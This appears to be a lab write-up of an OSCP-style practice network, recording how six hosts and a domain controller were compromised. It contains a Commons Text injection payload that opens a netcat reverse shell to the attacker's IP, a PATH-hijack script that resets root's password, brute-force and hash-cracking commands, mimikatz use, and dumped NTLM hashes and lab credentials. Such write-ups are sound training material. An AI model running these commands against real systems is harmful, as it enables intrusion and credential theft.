# OSCP B

## Network

**Given:**

- 192.168.145.147 MS01
- 192.168.145.149 
- 192.168.145.150 
- 192.168.145.151 

**Found:**

- 10.10.105.146 DC01
- 10.10.105.148 MS02

## Creds

```
eric.wallows:EricLikesRunning800 (given creds for 192.168.145.147)
web_svc:Diamond1
sql_svc:Dolphin1
Administrator:December31 (local admin on MS01)

other users:

```

## Network Enumeration

![](assets/Pasted%20image%2020250216235141.png)

## 192.168.145.149

### Enumeration

![](assets/Pasted%20image%2020250216235211.png)

Doing an udp scan we have snmp

![](assets/Pasted%20image%2020250217011643.png)

### Initial Access

Scanning it with snmpwalk extended

![](assets/Pasted%20image%2020250217011708.png)

So we have user kiero with a default password, we'll use hydra using -e nsr to try same pass as user, null or reversed.

```bash
hydra ftp://192.168.188.149 -l kiero -P /usr/share/wordlists/rockyou.txt.gz -e nsr
```

![](assets/Pasted%20image%2020250217012140.png)

And we get `kiero:kiero`.

Trying the ftp

![](assets/Pasted%20image%2020250217012252.png)

download the keys and inspect them

![](assets/Pasted%20image%2020250217013340.png)

the public one has the user john so we'll try ssh

![](assets/Pasted%20image%2020250217013444.png)

### Privilege Escalation

Get the local flag

![](assets/Pasted%20image%2020250217013539.png)

![](assets/Pasted%20image%2020250217121252.png)

RESET_PASSWD has the sudo bit, download the program and strings it.

We can see that calls chpasswd without absolute path.

![](assets/Pasted%20image%2020250217121404.png)

So we can hijack the path and create a malicious program with the same name in /tmp and add /tmp to our path.

We make a simple script in `/tmp/chpasswd` and chmod +x

```bash
echo 'echo "root:kiero" | /usr/sbin/chpasswd'
```

Now prepend /tmp to john's path and execute RESET_PASSWD

```bash
export PATH=/tmp:$PATH
```

![](assets/Pasted%20image%2020250217131950.png)

### Post Exploitation

![](assets/Pasted%20image%2020250217131500.png)

## 192.168.145.150

### Enumeration

![](assets/Pasted%20image%2020250217220330.png)

Webpage on 8080 shows us that there is an api that is up

![](assets/Pasted%20image%2020250217220452.png)

Using feroxbuster we find /search and /CHANGELOG

![](assets/Pasted%20image%2020250218132246.png)

### Initial Access

![](assets/Pasted%20image%2020250218132311.png)

Searching for vulns for Apache Commons Text 1.8 we find Text4Logs

https://github.com/sunnyvale-it/CVE-2022-42889-PoC

So executing `${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.229 443 -e sh')}` in the search function we can get a shell. (URL econde with cyberchef)

![](assets/Pasted%20image%2020250218132521.png)

![](assets/Pasted%20image%2020250218132546.png)

### Privilege Escalation

Get the flag

![](assets/Pasted%20image%2020250218132813.png)

In /opt we can see the project, and a App.java file, this app opens a socket on 5000.

![](assets/Pasted%20image%2020250219102300.png)

Using ss we see an internal port 8000

![](assets/Pasted%20image%2020250219110044.png)

And using ps aux we can see that that port is for java debuging

![](assets/Pasted%20image%2020250219110452.png)

Transfer chisel and make a tunnel and access that port.

![](assets/Pasted%20image%2020250219110302.png)

We can use jdwp-shellifier https://github.com/IOActive/jdwp-shellifier

![](assets/Pasted%20image%2020250219113803.png)

In the command, we put the suid bit to make /bin/bash executable by root, while the debugger is waiting for the program to execute, we nc to port 5000 to reach the breakpoint.

![](assets/Pasted%20image%2020250219113915.png)

Then if we check with dev user

![](assets/Pasted%20image%2020250219114007.png)

### Post Exploitation

![](assets/Pasted%20image%2020250219114043.png)

## 192.168.145.151

### Enumeration

![](assets/Pasted%20image%2020250220235427.png)

### Initial Access

http server has nothing, let's search for a exploit for 8021, freeswitch-event

![](assets/Pasted%20image%2020250219125219.png)

![](assets/Pasted%20image%2020250219125235.png)

We can put a powershell reverse shell 

![](assets/Pasted%20image%2020250219125500.png)

And we  got a shell

![](assets/Pasted%20image%2020250219125519.png)

### Privilege Escalation

Get the local flag

![](assets/Pasted%20image%2020250219125604.png)

Chris has seimpersonate

![](assets/Pasted%20image%2020250219125713.png)

Transfer juicypotatong to the machine, make a reverse shell with msfvenom and listen at 8888.

![](assets/Pasted%20image%2020250219133859.png)

### Post Exploitation

![](assets/Pasted%20image%2020250219133956.png)


## 192.168.145.147

### Enumeration

![](assets/Pasted%20image%2020250219134541.png)

### Initial Access

Use the provided credentials to SSH to the machine.

### Privilege Escalation

Transfer adPEAS and 

![](assets/Pasted%20image%2020250219235957.png)

![](assets/Pasted%20image%2020250220000022.png)

![](assets/Pasted%20image%2020250220000542.png)

Transfer chisel and make a tunnel and get kerberoastable users hashes

![](assets/Pasted%20image%2020250220001918.png)

```bash
hashcat -m 13100 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force
```

![](assets/Pasted%20image%2020250220002053.png)

We get `web_svc:Diamond1` and `sql_svc:Dolphin1`

User eric has seimpersonate so we transfer printer spoofer and

![](assets/Pasted%20image%2020250220174238.png)

### Post Exploitation

Transfer mimikatz to the host.

`sekurlsa::logonpassword`

![](assets/Pasted%20image%2020250220181430.png)

Using hashcat

![](assets/Pasted%20image%2020250220181515.png)

Start a ssh tunnel to be able to scan and work in the internal network

![](assets/Pasted%20image%2020250220212017.png)

Doing a ping sweep we have the third machine.

![](assets/Pasted%20image%2020250220004507.png)

## 10.10.105.148

### Enumeration

![](assets/Pasted%20image%2020250220093430.png)

### Initial Access

Using `sql_svc:Dolphin1` we can connect to mssql on ms02

`proxychains -q impacket-mssqlclient 'oscp.exam/sql_svc:Dolphin1@10.10.105.148' -windows-auth`

![](assets/Pasted%20image%2020250220212103.png)

![](assets/Pasted%20image%2020250220220257.png)

### Privilege Escalation

![](assets/Pasted%20image%2020250220220337.png)

In the pivot, we can transfer nc.exe and start a listener and within msql start a powershell rverse shell

![](assets/Pasted%20image%2020250220223306.png)

![](assets/Pasted%20image%2020250220223353.png)

Now we notice windows.old, so we can get SAM and SYSTEM.

Transfer them to the pivot via smb share

```bash
mkdir tests
New-SmbShare -Name "tests" -Path "C:\tests" -FullAccess "Everyone"
```


![](assets/Pasted%20image%2020250220224532.png)

Now create a smbshare on kali and copy them again

![](assets/Pasted%20image%2020250220224613.png)

Now using secretsdump we get the hashes for MS02

![](assets/Pasted%20image%2020250220224641.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```

## 10.10.105.146 DC

### Enumeration

![](assets/Pasted%20image%2020250220093709.png)

### Initial Access

Using the hash from `tom_admin` obtained in MS02 we can evil-winrm inside.

![](assets/Pasted%20image%2020250220225219.png)

### Privilege Escalation

As tom_admin is privileged we can make a DCsync attack and get all the hashes

![](assets/Pasted%20image%2020250220230713.png)

Use the admin hash to winrm

![](assets/Pasted%20image%2020250220230931.png)

### Post Exploitation

Get the proof

![](assets/Pasted%20image%2020250220230917.png)